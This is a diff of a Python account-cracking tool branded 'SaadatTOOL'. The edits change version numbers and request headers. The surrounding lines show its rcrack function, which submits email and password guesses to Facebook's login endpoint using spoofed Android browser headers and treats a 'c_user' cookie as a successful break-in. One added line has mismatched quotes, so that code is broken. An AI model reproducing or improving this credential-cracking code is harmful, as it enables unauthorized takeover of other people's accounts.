@@ -177,7 +177,7 @@ logo =                                          ("""
 \033[1;32m     \033[1;35mGITHUB       :  \033[1;35mArman
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mFREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35mSaadat
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m10.0.0
+\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m.0.2
 \033[1;37m================= \33[32;45mSaadat\33[0;m =====================
  
        \33[37;41m\t WELCOME TO SaadatTOOL\33[0;m
@@ -203,9 +203,9 @@ else:
     
 try:
     print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 5.2
-    update = ('5.2')
-    update = ('5.2')
+    v = 0.2
+    update = ('0.2')
+    update = ('0.2')
     if str(v) in update:
         os.system('clear')
     else:pass
@@ -307,7 +307,7 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'free.facebook.com',
+            header_freefb = {"authority': 'm.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -318,13 +318,13 @@ def rcrack(uid,pwx,tl):
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
-           'sec-ch-ua-platform-version': '"10.0.0"',
+           'sec-ch-ua-platform-version': '".0.2"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
-           'user-agent':pro}
+           'user-agent': pro}
             lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
